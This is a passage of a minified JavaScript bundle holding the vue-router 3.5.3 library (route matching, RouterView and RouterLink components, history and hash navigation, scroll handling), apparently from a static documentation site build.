a=t.instances[r],o=t.enteredCbs[r];if(a&&o){delete t.enteredCbs[r];for(var i=0;i<o.length;i++)a._isBeingDestroyed||o[i](a)}}}}var Qa={name:"RouterView",functional:!0,props:{name:{type:String,default:"default"}},render:function(n,e){var t=e.props,r=e.children,a=e.parent,o=e.data;o.routerView=!0;for(var i=a.$createElement,s=t.name,l=a.$route,c=a._routerViewCache||(a._routerViewCache={}),p=0,d=!1;a&&a._routerRoot!==a;){var u=a.$vnode?a.$vnode.data:{};u.routerView&&p++,u.keepAlive&&a._directInactive&&a._inactive&&(d=!0),a=a.$parent}if(o.routerViewDepth=p,d){var m=c[s],g=m&&m.component;return g?(m.configProps&&Za(g,o,m.route,m.configProps),i(g,o,r)):i()}var f=l.matched[p],h=f&&f.components[s];if(!f||!h)return c[s]=null,i();c[s]={component:h},o.registerRouteInstance=function(n,e){var t=f.instances[s];(e&&t!==n||!e&&t===n)&&(f.instances[s]=e)},(o.hook||(o.hook={})).prepatch=function(n,e){f.instances[s]=e.componentInstance},o.hook.init=function(n){n.data.keepAlive&&n.componentInstance&&n.componentInstance!==f.instances[s]&&(f.instances[s]=n.componentInstance),Ya(l)};var b=f.props&&f.props[s];return b&&(Oa(c[s],{route:l,configProps:b}),Za(h,o,l,b)),i(h,o,r)}};function Za(n,e,t,r){var a=e.props=function(n,e){switch(typeof e){case"undefined":return;case"object":return e;case"function":return e(n);case"boolean":return e?n.params:void 0;default:0}}(t,r);if(a){a=e.props=Oa({},a);var o=e.attrs=e.attrs||{};for(var i in a)n.props&&i in n.props||(o[i]=a[i],delete a[i])}}function no(n,e,t){var r=n.charAt(0);if("/"===r)return n;if("?"===r||"#"===r)return e+n;var a=e.split("/");t&&a[a.length-1]||a.pop();for(var o=n.replace(/^\//,"").split("/"),i=0;i<o.length;i++){var s=o[i];".."===s?a.pop():"."!==s&&a.push(s)}return""!==a[0]&&a.unshift(""),a.join("/")}function eo(n){return n.replace(/\/+/g,"/")}var to=Array.isArray||function(n){return"[object Array]"==Object.prototype.toString.call(n)},ro=vo,ao=co,oo=function(n,e){return uo(co(n,e),e)},io=uo,so=bo,lo=new RegExp(["(\\\\.)","([\\/.])?(?:(?:\\:(\\w+)(?:\\(((?:\\\\.|[^\\\\()])+)\\))?|\\(((?:\\\\.|[^\\\\()])+)\\))([+*?])?|(\\*))"].join("|"),"g");function co(n,e){for(var t,r=[],a=0,o=0,i="",s=e&&e.delimiter||"/";null!=(t=lo.exec(n));){var l=t[0],c=t[1],p=t.index;if(i+=n.slice(o,p),o=p+l.length,c)i+=c[1];else{var d=n[o],u=t[2],m=t[3],g=t[4],f=t[5],h=t[6],b=t[7];i&&(r.push(i),i="");var v=null!=u&&null!=d&&d!==u,y="+"===h||"*"===h,k="?"===h||"*"===h,x=t[2]||s,w=g||f;r.push({name:m||a++,prefix:u||"",delimiter:x,optional:k,repeat:y,partial:v,asterisk:!!b,pattern:w?go(w):b?".*":"[^"+mo(x)+"]+?"})}}return o<n.length&&(i+=n.substr(o)),i&&r.push(i),r}function po(n){return encodeURI(n).replace(/[\/?#]/g,(function(n){return"%"+n.charCodeAt(0).toString(16).toUpperCase()}))}function uo(n,e){for(var t=new Array(n.length),r=0;r<n.length;r++)"object"==typeof n[r]&&(t[r]=new RegExp("^(?:"+n[r].pattern+")$",ho(e)));return function(e,r){for(var a="",o=e||{},i=(r||{}).pretty?po:encodeURIComponent,s=0;s<n.length;s++){var l=n[s];if("string"!=typeof l){var c,p=o[l.name];if(null==p){if(l.optional){l.partial&&(a+=l.prefix);continue}throw new TypeError('Expected "'+l.name+'" to be defined')}if(to(p)){if(!l.repeat)throw new TypeError('Expected "'+l.name+'" to not repeat, but received `'+JSON.stringify(p)+"`");if(0===p.length){if(l.optional)continue;throw new TypeError('Expected "'+l.name+'" to not be empty')}for(var d=0;d<p.length;d++){if(c=i(p[d]),!t[s].test(c))throw new TypeError('Expected all "'+l.name+'" to match "'+l.pattern+'", but received `'+JSON.stringify(c)+"`");a+=(0===d?l.prefix:l.delimiter)+c}}else{if(c=l.asterisk?encodeURI(p).replace(/[?#]/g,(function(n){return"%"+n.charCodeAt(0).toString(16).toUpperCase()})):i(p),!t[s].test(c))throw new TypeError('Expected "'+l.name+'" to match "'+l.pattern+'", but received "'+c+'"');a+=l.prefix+c}}else a+=l}return a}}function mo(n){return n.replace(/([.+*?=^!:${}()[\]|\/\\])/g,"\\$1")}function go(n){return n.replace(/([=!:$\/()])/g,"\\$1")}function fo(n,e){return n.keys=e,n}function ho(n){return n&&n.sensitive?"":"i"}function bo(n,e,t){to(e)||(t=e||t,e=[]);for(var r=(t=t||{}).strict,a=!1!==t.end,o="",i=0;i<n.length;i++){var s=n[i];if("string"==typeof s)o+=mo(s);else{var l=mo(s.prefix),c="(?:"+s.pattern+")";e.push(s),s.repeat&&(c+="(?:"+l+c+")*"),o+=c=s.optional?s.partial?l+"("+c+")?":"(?:"+l+"("+c+"))?":l+"("+c+")"}}var p=mo(t.delimiter||"/"),d=o.slice(-p.length)===p;return r||(o=(d?o.slice(0,-p.length):o)+"(?:"+p+"(?=$))?"),o+=a?"$":r&&d?"":"(?="+p+"|$)",fo(new RegExp("^"+o,ho(t)),e)}function vo(n,e,t){return to(e)||(t=e||t,e=[]),t=t||{},n instanceof RegExp?function(n,e){var t=n.source.match(/\((?!\?)/g);if(t)for(var r=0;r<t.length;r++)e.push({name:r,prefix:null,delimiter:null,optional:!1,repeat:!1,partial:!1,asterisk:!1,pattern:null});return fo(n,e)}(n,e):to(n)?function(n,e,t){for(var r=[],a=0;a<n.length;a++)r.push(vo(n[a],e,t).source);return fo(new RegExp("(?:"+r.join("|")+")",ho(t)),e)}(n,e,t):function(n,e,t){return bo(co(n,t),e,t)}(n,e,t)}ro.parse=ao,ro.compile=oo,ro.tokensToFunction=io,ro.tokensToRegExp=so;var yo=Object.create(null);function ko(n,e,t){e=e||{};try{var r=yo[n]||(yo[n]=ro.compile(n));return"string"==typeof e.pathMatch&&(e[0]=e.pathMatch),r(e,{pretty:!0})}catch(n){return""}finally{delete e[0]}}function xo(n,e,t,r){var a="string"==typeof n?{path:n}:n;if(a._normalized)return a;if(a.name){var o=(a=Oa({},n)).params;return o&&"object"==typeof o&&(a.params=Oa({},o)),a}if(!a.path&&a.params&&e){(a=Oa({},a))._normalized=!0;var i=Oa(Oa({},e.params),a.params);if(e.name)a.name=e.name,a.params=i;else if(e.matched.length){var s=e.matched[e.matched.length-1].path;a.path=ko(s,i,e.path)}else 0;return a}var l=function(n){var e="",t="",r=n.indexOf("#");r>=0&&(e=n.slice(r),n=n.slice(0,r));var a=n.indexOf("?");return a>=0&&(t=n.slice(a+1),n=n.slice(0,a)),{path:n,query:t,hash:e}}(a.path||""),c=e&&e.path||"/",p=l.path?no(l.path,c,t||a.append):c,d=function(n,e,t){void 0===e&&(e={});var r,a=t||Fa;try{r=a(n||"")}catch(n){r={}}for(var o in e){var i=e[o];r[o]=Array.isArray(i)?i.map(qa):qa(i)}return r}(l.query,a.query,r&&r.options.parseQuery),u=a.hash||l.hash;return u&&"#"!==u.charAt(0)&&(u="#"+u),{_normalized:!0,path:p,query:d,hash:u}}var wo,So=function(){},jo={name:"RouterLink",props:{to:{type:[String,Object],required:!0},tag:{type:String,default:"a"},custom:Boolean,exact:Boolean,exactPath:Boolean,append:Boolean,replace:Boolean,activeClass:String,exactActiveClass:String,ariaCurrentValue:{type:String,default:"page"},event:{type:[String,Array],default:"click"}},render:function(n){var e=this,t=this.$router,r=this.$route,a=t.resolve(this.to,r,this.append),o=a.location,i=a.route,s=a.href,l={},c=t.options.linkActiveClass,p=t.options.linkExactActiveClass,d=null==c?"router-link-active":c,u=null==p?"router-link-exact-active":p,m=null==this.activeClass?d:this.activeClass,g=null==this.exactActiveClass?u:this.exactActiveClass,f=i.redirectedFrom?Ga(null,xo(i.redirectedFrom),null,t):i;l[g]=Wa(r,f,this.exactPath),l[m]=this.exact||this.exactPath?l[g]:function(n,e){return 0===n.path.replace(Ua,"/").indexOf(e.path.replace(Ua,"/"))&&(!e.hash||n.hash===e.hash)&&function(n,e){for(var t in e)if(!(t in n))return!1;return!0}(n.query,e.query)}(r,f);var h=l[g]?this.ariaCurrentValue:null,b=function(n){Eo(n)&&(e.replace?t.replace(o,So):t.push(o,So))},v={click:Eo};Array.isArray(this.event)?this.event.forEach((function(n){v[n]=b})):v[this.event]=b;var y={class:l},k=!this.$scopedSlots.$hasNormal&&this.$scopedSlots.default&&this.$scopedSlots.default({href:s,route:i,navigate:b,isActive:l[m],isExactActive:l[g]});if(k){if(1===k.length)return k[0];if(k.length>1||!k.length)return 0===k.length?n():n("span",{},k)}if("a"===this.tag)y.on=v,y.attrs={href:s,"aria-current":h};else{var x=function n(e){var t;if(e)for(var r=0;r<e.length;r++){if("a"===(t=e[r]).tag)return t;if(t.children&&(t=n(t.children)))return t}}(this.$slots.default);if(x){x.isStatic=!1;var w=x.data=Oa({},x.data);for(var S in w.on=w.on||{},w.on){var j=w.on[S];S in v&&(w.on[S]=Array.isArray(j)?j:[j])}for(var E in v)E in w.on?w.on[E].push(v[E]):w.on[E]=b;var A=x.data.attrs=Oa({},x.data.attrs);A.href=s,A["aria-current"]=h}else y.on=v}return n(this.tag,y,this.$slots.default)}};function Eo(n){if(!(n.metaKey||n.altKey||n.ctrlKey||n.shiftKey||n.defaultPrevented||void 0!==n.button&&0!==n.button)){if(n.currentTarget&&n.currentTarget.getAttribute){var e=n.currentTarget.getAttribute("target");if(/\b_blank\b/i.test(e))return}return n.preventDefault&&n.preventDefault(),!0}}var Ao="undefined"!=typeof window;function To(n,e,t,r,a){var o=e||[],i=t||Object.create(null),s=r||Object.create(null);n.forEach((function(n){!function n(e,t,r,a,o,i){var s=a.path,l=a.name;0;var c=a.pathToRegexpOptions||{},p=function(n,e,t){t||(n=n.replace(/\/$/,""));if("/"===n[0])return n;if(null==e)return n;return eo(e.path+"/"+n)}(s,o,c.strict);"boolean"==typeof a.caseSensitive&&(c.sensitive=a.caseSensitive);var d={path:p,regex:_o(p,c),components:a.components||{default:a.component},alias:a.alias?"string"==typeof a.alias?[a.alias]:a.alias:[],instances:{},enteredCbs:{},name:l,parent:o,matchAs:i,redirect:a.redirect,beforeEnter:a.beforeEnter,meta:a.meta||{},props:null==a.props?{}:a.components?a.props:{default:a.props}};a.children&&a.children.forEach((function(a){var o=i?eo(i+"/"+a.path):void 0;n(e,t,r,a,d,o)}));t[d.path]||(e.push(d.path),t[d.path]=d);if(void 0!==a.alias)for(var u=Array.isArray(a.alias)?a.alias:[a.alias],m=0;m<u.length;++m){0;var g={path:u[m],children:a.children};n(e,t,r,g,o,d.path||"/")}l&&(r[l]||(r[l]=d))}(o,i,s,n,a)}));for(var l=0,c=o.length;l<c;l++)"*"===o[l]&&(o.push(o.splice(l,1)[0]),c--,l--);return{pathList:o,pathMap:i,nameMap:s}}function _o(n,e){return ro(n,[],e)}function Io(n,e){var t=To(n),r=t.pathList,a=t.pathMap,o=t.nameMap;function i(n,t,i){var s=xo(n,t,!1,e),c=s.name;if(c){var p=o[c];if(!p)return l(null,s);var d=p.regex.keys.filter((function(n){return!n.optional})).map((function(n){return n.name}));if("object"!=typeof s.params&&(s.params={}),t&&"object"==typeof t.params)for(var u in t.params)!(u in s.params)&&d.indexOf(u)>-1&&(s.params[u]=t.params[u]);return s.path=ko(p.path,s.params),l(p,s,i)}if(s.path){s.params={};for(var m=0;m<r.length;m++){var g=r[m],f=a[g];if(Co(f.regex,s.path,s.params))return l(f,s,i)}}return l(null,s)}function s(n,t){var r=n.redirect,a="function"==typeof r?r(Ga(n,t,null,e)):r;if("string"==typeof a&&(a={path:a}),!a||"object"!=typeof a)return l(null,t);var s=a,c=s.name,p=s.path,d=t.query,u=t.hash,m=t.params;if(d=s.hasOwnProperty("query")?s.query:d,u=s.hasOwnProperty("hash")?s.hash:u,m=s.hasOwnProperty("params")?s.params:m,c){o[c];return i({_normalized:!0,name:c,query:d,hash:u,params:m},void 0,t)}if(p){var g=function(n,e){return no(n,e.parent?e.parent.path:"/",!0)}(p,n);return i({_normalized:!0,path:ko(g,m),query:d,hash:u},void 0,t)}return l(null,t)}function l(n,t,r){return n&&n.redirect?s(n,r||t):n&&n.matchAs?function(n,e,t){var r=i({_normalized:!0,path:ko(t,e.params)});if(r){var a=r.matched,o=a[a.length-1];return e.params=r.params,l(o,e)}return l(null,e)}(0,t,n.matchAs):Ga(n,t,r,e)}return{match:i,addRoute:function(n,e){var t="object"!=typeof n?o[n]:void 0;To([e||n],r,a,o,t),t&&t.alias.length&&To(t.alias.map((function(n){return{path:n,children:[e]}})),r,a,o,t)},getRoutes:function(){return r.map((function(n){return a[n]}))},addRoutes:function(n){To(n,r,a,o)}}}function Co(n,e,t){var r=e.match(n);if(!r)return!1;if(!t)return!0;for(var a=1,o=r.length;a<o;++a){var i=n.keys[a-1];i&&(t[i.name||"pathMatch"]="string"==typeof r[a]?Na(r[a]):r[a])}return!0}var Po=Ao&&window.performance&&window.performance.now?window.performance:Date;function Ro(){return Po.now().toFixed(3)}var Bo=Ro();function Oo(){return Bo}function zo(n){return Bo=n}var Mo=Object.create(null);function Lo(){"scrollRestoration"in window.history&&(window.history.scrollRestoration="manual");var n=window.location.protocol+"//"+window.location.host,e=window.location.href.replace(n,""),t=Oa({},window.history.state);return t.key=Oo(),window.history.replaceState(t,"",e),window.addEventListener("popstate",qo),function(){window.removeEventListener("popstate",qo)}}function Do(n,e,t,r){if(n.app){var a=n.options.scrollBehavior;a&&n.app.$nextTick((function(){var o=function(){var n=Oo();if(n)return Mo[n]}(),i=a.call(n,e,t,r?o:null);i&&("function"==typeof i.then?i.then((function(n){Jo(n,o)})).catch((function(n){0})):Jo(i,o))}))}}function No(){var n=Oo();n&&(Mo[n]={x:window.pageXOffset,y:window.pageYOffset})}function qo(n){No(),n.state&&n.state.key&&zo(n.state.key)}function Fo(n){return Uo(n.x)||Uo(n.y)}function $o(n){return{x:Uo(n.x)?n.x:window.pageXOffset,y:Uo(n.y)?n.y:window.pageYOffset}}function Uo(n){return"number"==typeof n}var Go=/^#\d/;function Jo(n,e){var t,r="object"==typeof n;if(r&&"string"==typeof n.selector){var a=Go.test(n.selector)?document.getElementById(n.selector.slice(1)):document.querySelector(n.selector);if(a){var o=n.offset&&"object"==typeof n.offset?n.offset:{};e=function(n,e){var t=document.documentElement.getBoundingClientRect(),r=n.getBoundingClientRect();return{x:r.left-t.left-e.x,y:r.top-t.top-e.y}}(a,o={x:Uo((t=o).x)?t.x:0,y:Uo(t.y)?t.y:0})}else Fo(n)&&(e=$o(n))}else r&&Fo(n)&&(e=$o(n));e&&("scrollBehavior"in document.documentElement.style?window.scrollTo({left:e.x,top:e.y,behavior:n.behavior}):window.scrollTo(e.x,e.y))}var Vo,Ho=Ao&&((-1===(Vo=window.navigator.userAgent).indexOf("Android 2.")&&-1===Vo.indexOf("Android 4.0")||-1===Vo.indexOf("Mobile Safari")||-1!==Vo.indexOf("Chrome")||-1!==Vo.indexOf("Windows Phone"))&&window.history&&"function"==typeof window.history.pushState);function Ko(n,e){No();var t=window.history;try{if(e){var r=Oa({},t.state);r.key=Oo(),t.replaceState(r,"",n)}else t.pushState({key:zo(Ro())},"",n)}catch(t){window.location[e?"replace":"assign"](n)}}function Wo(n){Ko(n,!0)}function Xo(n,e,t){var r=function(a){a>=n.length?t():n[a]?e(n[a],(function(){r(a+1)})):r(a+1)};r(0)}var Yo={redirected:2,aborted:4,cancelled:8,duplicated:16};function Qo(n,e){return ni(n,e,Yo.redirected,'Redirected when going from "'+n.fullPath+'" to "'+function(n){if("string"==typeof n)return n;if("path"in n)return n.path;var e={};return ei.forEach((function(t){t in n&&(e[t]=n[t])})),JSON.stringify(e,null,2)}(e)+'" via a navigation guard.')}function Zo(n,e){return ni(n,e,Yo.cancelled,'Navigation cancelled from "'+n.fullPath+'" to "'+e.fullPath+'" with a new navigation.')}function ni(n,e,t,r){var a=new Error(r);return a._isRouter=!0,a.from=n,a.to=e,a.type=t,a}var ei=["params","query","hash"];function ti(n){return Object.prototype.toString.call(n).indexOf("Error")>-1}function ri(n,e){return ti(n)&&n._isRouter&&(null==e||n.type===e)}function ai(n){return function(e,t,r){var a=!1,o=0,i=null;oi(n,(function(n,e,t,s){if("function"==typeof n&&void 0===n.cid){a=!0,o++;var l,c=li((function(e){var a;((a=e).__esModule||si&&"Module"===a[Symbol.toStringTag])&&(e=e.default),n.resolved="function"==typeof e?e:wo.extend(e),t.components[s]=e,--o<=0&&r()})),p=li((function(n){var e="Failed to resolve async component "+s+": "+n;i||(i=ti(n)?n:new Error(e),r(i))}));try{l=n(c,p)}catch(n){p(n)}if(l)if("function"==typeof l.then)l.then(c,p);else{var d=l.component;d&&"function"==typeof d.then&&d.then(c,p)}}})),a||r()}}function oi(n,e){return ii(n.map((function(n){return Object.keys(n.components).map((function(t){return e(n.components[t],n.instances[t],n,t)}))})))}function ii(n){return Array.prototype.concat.apply([],n)}var si="function"==typeof Symbol&&"symbol"==typeof Symbol.toStringTag;function li(n){var e=!1;return function(){for(var t=[],r=arguments.length;r--;)t[r]=arguments[r];if(!e)return e=!0,n.apply(this,t)}}var ci=function(n,e){this.router=n,this.base=function(n){if(!n)if(Ao){var e=document.querySelector("base");n=(n=e&&e.getAttribute("href")||"/").replace(/^https?:\/\/[^\/]+/,"")}else n="/";"/"!==n.charAt(0)&&(n="/"+n);return n.replace(/\/$/,"")}(e),this.current=Va,this.pending=null,this.ready=!1,this.readyCbs=[],this.readyErrorCbs=[],this.errorCbs=[],this.listeners=[]};function pi(n,e,t,r){var a=oi(n,(function(n,r,a,o){var i=function(n,e){"function"!=typeof n&&(n=wo.extend(n));return n.options[e]}(n,e);if(i)return Array.isArray(i)?i.map((function(n){return t(n,r,a,o)})):t(i,r,a,o)}));return ii(r?a.reverse():a)}function di(n,e){if(e)return function(){return n.apply(e,arguments)}}ci.prototype.listen=function(n){this.cb=n},ci.prototype.onReady=function(n,e){this.ready?n():(this.readyCbs.push(n),e&&this.readyErrorCbs.push(e))},ci.prototype.onError=function(n){this.errorCbs.push(n)},ci.prototype.transitionTo=function(n,e,t){var r,a=this;try{r=this.router.match(n,this.current)}catch(n){throw this.errorCbs.forEach((function(e){e(n)})),n}var o=this.current;this.confirmTransition(r,(function(){a.updateRoute(r),e&&e(r),a.ensureURL(),a.router.afterHooks.forEach((function(n){n&&n(r,o)})),a.ready||(a.ready=!0,a.readyCbs.forEach((function(n){n(r)})))}),(function(n){t&&t(n),n&&!a.ready&&(ri(n,Yo.redirected)&&o===Va||(a.ready=!0,a.readyErrorCbs.forEach((function(e){e(n)}))))}))},ci.prototype.confirmTransition=function(n,e,t){var r=this,a=this.current;this.pending=n;var o,i,s=function(n){!ri(n)&&ti(n)&&(r.errorCbs.length?r.errorCbs.forEach((function(e){e(n)})):console.error(n)),t&&t(n)},l=n.matched.length-1,c=a.matched.length-1;if(Wa(n,a)&&l===c&&n.matched[l]===a.matched[c])return this.ensureURL(),n.hash&&Do(this.router,a,n,!1),s(((i=ni(o=a,n,Yo.duplicated,'Avoided redundant navigation to current location: "'+o.fullPath+'".')).name="NavigationDuplicated",i));var p=function(n,e){var t,r=Math.max(n.length,e.length);for(t=0;t<r&&n[t]===e[t];t++);return{updated:e.slice(0,t),activated:e.slice(t),deactivated:n.slice(t)}}(this.current.matched,n.matched),d=p.updated,u=p.deactivated,m=p.activated,g=[].concat(function(n){return pi(n,"beforeRouteLeave",di,!0)}(u),this.router.beforeHooks,function(n){return pi(n,"beforeRouteUpdate",di)}(d),m.map((function(n){return n.beforeEnter})),ai(m)),f=function(e,t){if(r.pending!==n)return s(Zo(a,n));try{e(n,a,(function(e){!1===e?(r.ensureURL(!0),s(function(n,e){return ni(n,e,Yo.aborted,'Navigation aborted from "'+n.fullPath+'" to "'+e.fullPath+'" via a navigation guard.')}(a,n))):ti(e)?(r.ensureURL(!0),s(e)):"string"==typeof e||"object"==typeof e&&("string"==typeof e.path||"string"==typeof e.name)?(s(Qo(a,n)),"object"==typeof e&&e.replace?r.replace(e):r.push(e)):t(e)}))}catch(n){s(n)}};Xo(g,f,(function(){Xo(function(n){return pi(n,"beforeRouteEnter",(function(n,e,t,r){return function(n,e,t){return function(r,a,o){return n(r,a,(function(n){"function"==typeof n&&(e.enteredCbs[t]||(e.enteredCbs[t]=[]),e.enteredCbs[t].push(n)),o(n)}))}}(n,t,r)}))}(m).concat(r.router.resolveHooks),f,(function(){if(r.pending!==n)return s(Zo(a,n));r.pending=null,e(n),r.router.app&&r.router.app.$nextTick((function(){Ya(n)}))}))}))},ci.prototype.updateRoute=function(n){this.current=n,this.cb&&this.cb(n)},ci.prototype.setupListeners=function(){},ci.prototype.teardown=function(){this.listeners.forEach((function(n){n()})),this.listeners=[],this.current=Va,this.pending=null};var ui=function(n){function e(e,t){n.call(this,e,t),this._startLocation=mi(this.base)}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.setupListeners=function(){var n=this;if(!(this.listeners.length>0)){var e=this.router,t=e.options.scrollBehavior,r=Ho&&t;r&&this.listeners.push(Lo());var a=function(){var t=n.current,a=mi(n.base);n.current===Va&&a===n._startLocation||n.transitionTo(a,(function(n){r&&Do(e,n,t,!0)}))};window.addEventListener("popstate",a),this.listeners.push((function(){window.removeEventListener("popstate",a)}))}},e.prototype.go=function(n){window.history.go(n)},e.prototype.push=function(n,e,t){var r=this,a=this.current;this.transitionTo(n,(function(n){Ko(eo(r.base+n.fullPath)),Do(r.router,n,a,!1),e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var r=this,a=this.current;this.transitionTo(n,(function(n){Wo(eo(r.base+n.fullPath)),Do(r.router,n,a,!1),e&&e(n)}),t)},e.prototype.ensureURL=function(n){if(mi(this.base)!==this.current.fullPath){var e=eo(this.base+this.current.fullPath);n?Ko(e):Wo(e)}},e.prototype.getCurrentLocation=function(){return mi(this.base)},e}(ci);function mi(n){var e=window.location.pathname,t=e.toLowerCase(),r=n.toLowerCase();return!n||t!==r&&0!==t.indexOf(eo(r+"/"))||(e=e.slice(n.length)),(e||"/")+window.location.search+window.location.hash}var gi=function(n){function e(e,t,r){n.call(this,e,t),r&&function(n){var e=mi(n);if(!/^\/#/.test(e))return window.location.replace(eo(n+"/#"+e)),!0}(this.base)||fi()}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.setupListeners=function(){var n=this;if(!(this.listeners.length>0)){var e=this.router.options.scrollBehavior,t=Ho&&e;t&&this.listeners.push(Lo());var r=function(){var e=n.current;fi()&&n.transitionTo(hi(),(function(r){t&&Do(n.router,r,e,!0),Ho||yi(r.fullPath)}))},a=Ho?"popstate":"hashchange";window.addEventListener(a,r),this.listeners.push((function(){window.removeEventListener(a,r)}))}},e.prototype.push=function(n,e,t){var r=this,a=this.current;this.transitionTo(n,(function(n){vi(n.fullPath),Do(r.router,n,a,!1),e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var r=this,a=this.current;this.transitionTo(n,(function(n){yi(n.fullPath),Do(r.router,n,a,!1),e&&e(n)}),t)},e.prototype.go=function(n){window.history.go(n)},e.prototype.ensureURL=function(n){var e=this.current.fullPath;hi()!==e&&(n?vi(e):yi(e))},e.prototype.getCurrentLocation=function(){return hi()},e}(ci);function fi(){var n=hi();return"/"===n.charAt(0)||(yi("/"+n),!1)}function hi(){var n=window.location.href,e=n.indexOf("#");return e<0?"":n=n.slice(e+1)}function bi(n){var e=window.location.href,t=e.indexOf("#");return(t>=0?e.slice(0,t):e)+"#"+n}function vi(n){Ho?Ko(bi(n)):window.location.hash=n}function yi(n){Ho?Wo(bi(n)):window.location.replace(bi(n))}var ki=function(n){function e(e,t){n.call(this,e,t),this.stack=[],this.index=-1}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.push=function(n,e,t){var r=this;this.transitionTo(n,(function(n){r.stack=r.stack.slice(0,r.index+1).concat(n),r.index++,e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var r=this;this.transitionTo(n,(function(n){r.stack=r.stack.slice(0,r.index).concat(n),e&&e(n)}),t)},e.prototype.go=function(n){var e=this,t=this.index+n;if(!(t<0||t>=this.stack.length)){var r=this.stack[t];this.confirmTransition(r,(function(){var n=e.current;e.index=t,e.updateRoute(r),e.router.afterHooks.forEach((function(e){e&&e(r,n)}))}),(function(n){ri(n,Yo.duplicated)&&(e.index=t)}))}},e.prototype.getCurrentLocation=function(){var n=this.stack[this.stack.length-1];return n?n.fullPath:"/"},e.prototype.ensureURL=function(){},e}(ci),xi=function(n){void 0===n&&(n={}),this.app=null,this.apps=[],this.options=n,this.beforeHooks=[],this.resolveHooks=[],this.afterHooks=[],this.matcher=Io(n.routes||[],this);var e=n.mode||"hash";switch(this.fallback="history"===e&&!Ho&&!1!==n.fallback,this.fallback&&(e="hash"),Ao||(e="abstract"),this.mode=e,e){case"history":this.history=new ui(this,n.base);break;case"hash":this.history=new gi(this,n.base,this.fallback);break;case"abstract":this.history=new ki(this,n.base);break;default:0}},wi={currentRoute:{configurable:!0}};function Si(n,e){return n.push(e),function(){var t=n.indexOf(e);t>-1&&n.splice(t,1)}}xi.prototype.match=function(n,e,t){return this.matcher.match(n,e,t)},wi.currentRoute.get=function(){return this.history&&this.history.current},xi.prototype.init=function(n){var e=this;if(this.apps.push(n),n.$once("hook:destroyed",(function(){var t=e.apps.indexOf(n);t>-1&&e.apps.splice(t,1),e.app===n&&(e.app=e.apps[0]||null),e.app||e.history.teardown()})),!this.app){this.app=n;var t=this.history;if(t instanceof ui||t instanceof gi){var r=function(n){t.setupListeners(),function(n){var r=t.current,a=e.options.scrollBehavior;Ho&&a&&"fullPath"in n&&Do(e,n,r,!1)}(n)};t.transitionTo(t.getCurrentLocation(),r,r)}t.listen((function(n){e.apps.forEach((function(e){e._route=n}))}))}},xi.prototype.beforeEach=function(n){return Si(this.beforeHooks,n)},xi.prototype.beforeResolve=function(n){return Si(this.resolveHooks,n)},xi.prototype.afterEach=function(n){return Si(this.afterHooks,n)},xi.prototype.onReady=function(n,e){this.history.onReady(n,e)},xi.prototype.onError=function(n){this.history.onError(n)},xi.prototype.push=function(n,e,t){var r=this;if(!e&&!t&&"undefined"!=typeof Promise)return new Promise((function(e,t){r.history.push(n,e,t)}));this.history.push(n,e,t)},xi.prototype.replace=function(n,e,t){var r=this;if(!e&&!t&&"undefined"!=typeof Promise)return new Promise((function(e,t){r.history.replace(n,e,t)}));this.history.replace(n,e,t)},xi.prototype.go=function(n){this.history.go(n)},xi.prototype.back=function(){this.go(-1)},xi.prototype.forward=function(){this.go(1)},xi.prototype.getMatchedComponents=function(n){var e=n?n.matched?n:this.resolve(n).route:this.currentRoute;return e?[].concat.apply([],e.matched.map((function(n){return Object.keys(n.components).map((function(e){return n.components[e]}))}))):[]},xi.prototype.resolve=function(n,e,t){var r=xo(n,e=e||this.history.current,t,this),a=this.match(r,e),o=a.redirectedFrom||a.fullPath;return{location:r,route:a,href:function(n,e,t){var r="hash"===t?"#"+e:e;return n?eo(n+"/"+r):r}(this.history.base,o,this.mode),normalizedTo:r,resolved:a}},xi.prototype.getRoutes=function(){return this.matcher.getRoutes()},xi.prototype.addRoute=function(n,e){this.matcher.addRoute(n,e),this.history.current!==Va&&this.history.transitionTo(this.history.getCurrentLocation())},xi.prototype.addRoutes=function(n){this.matcher.addRoutes(n),this.history.current!==Va&&this.history.transitionTo(this.history.getCurrentLocation())},Object.defineProperties(xi.prototype,wi),xi.install=function n(e){if(!n.installed||wo!==e){n.installed=!0,wo=e;var t=function(n){return void 0!==n},r=function(n,e){var r=n.$options._parentVnode;t(r)&&t(r=r.data)&&t(r=r.registerRouteInstance)&&r(n,e)};e.mixin({beforeCreate:function(){t(this.$options.router)?(this._routerRoot=this,this._router=this.$options.router,this._router.init(this),e.util.defineReactive(this,"_route",this._router.history.current)):this._routerRoot=this.$parent&&this.$parent._routerRoot||this,r(this,this)},destroyed:function(){r(this)}}),Object.defineProperty(e.prototype,"$router",{get:function(){return this._routerRoot._router}}),Object.defineProperty(e.prototype,"$route",{get:function(){return this._routerRoot._route}}),e.component("RouterView",Qa),e.component("RouterLink",jo);var a=e.config.optionMergeStrategies;a.beforeRouteEnter=a.beforeRouteLeave=a.beforeRouteUpdate=a.created}},xi.version="3.5.3",xi.isNavigationFailure=ri,xi.NavigationFailureType=Yo,xi.START_LOCATION=Va,Ao&&window.Vue&&window.Vue.use(xi);var ji=xi;t(182),t(183),t(258),t(46),t(260),t(26),t(27),t(261);function Ei(n){n.locales&&Object.keys(n.locales).forEach((function(e){n.locales[e].path=e})),Object.freeze(n)}t(74),t(97),t(134);function Ai(n){return(Ai="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&"function"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n})(n)}var Ti=t(76),_i=(t(192),t(28),t(53),t(232),t(233),t(48),t(30),{NotFound:function(){return Promise.all([t.e(1),t.e(13)]).then(t.bind(null,490))},Layout:function(){return Promise.all([t.e(1),t.e(11)]).then(t.bind(null,489))}}),Ii={"v-2dd0fd66":function(){return t.e(14).then(t.bind(null,491))},"v-182bbd6a":function(){return t.e(17).then(t.bind(null,492))},"v-43985582":function(){return t.e(15).then(t.bind(null,493))},"v-26d5b34d":function(){return t.e(16).then(t.bind(null,494))},"v-1177a00b":function(){return t.e(18).then(t.bind(null,495))},"v-71786ef2":function(){return t.e(20).then(t.bind(null,496))},"v-52ff49bd":function(){return 